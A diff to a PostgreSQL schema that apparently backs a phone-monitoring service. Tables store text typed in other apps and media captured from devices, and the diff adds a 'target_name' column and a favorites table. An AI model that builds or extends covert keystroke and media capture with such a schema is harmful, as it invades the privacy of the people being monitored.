@@ -32,9 +32,21 @@ CREATE TABLE IF NOT EXISTS typed_text (
     device_id    VARCHAR(64)  NOT NULL,
     package_name VARCHAR(255) NOT NULL,
     app_label    VARCHAR(255) NOT NULL DEFAULT '',
+    target_name  TEXT         NOT NULL DEFAULT '',
     text         TEXT         NOT NULL,
     captured_at  TIMESTAMPTZ  NOT NULL,
     received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW()
+);
+
+ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS target_name TEXT NOT NULL DEFAULT '';
+
+CREATE TABLE IF NOT EXISTS favorites (
+    id          BIGSERIAL    PRIMARY KEY,
+    device_id   VARCHAR(64)  NOT NULL,
+    item_key    VARCHAR(8)   NOT NULL,
+    item_id     BIGINT       NOT NULL,
+    created_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
+    CONSTRAINT uq_favorite_item UNIQUE (device_id, item_key, item_id)
 );
 
 CREATE INDEX IF NOT EXISTS idx_typed_received ON typed_text (received_at DESC);
@@ -70,6 +82,8 @@ CREATE INDEX IF NOT EXISTS idx_media_received ON media_captures (received_at DES
 CREATE INDEX IF NOT EXISTS idx_media_device   ON media_captures (device_id);
 CREATE INDEX IF NOT EXISTS idx_media_package  ON media_captures (package_name);
 CREATE INDEX IF NOT EXISTS idx_media_source   ON media_captures (source);
+
+CREATE INDEX IF NOT EXISTS idx_favorites_device ON favorites (device_id, created_at DESC);
 
 -- Heartbeats from each companion app. The dashboard uses these to show which
 -- app is active on each phone, and the API uses them to arbitrate forwarding.
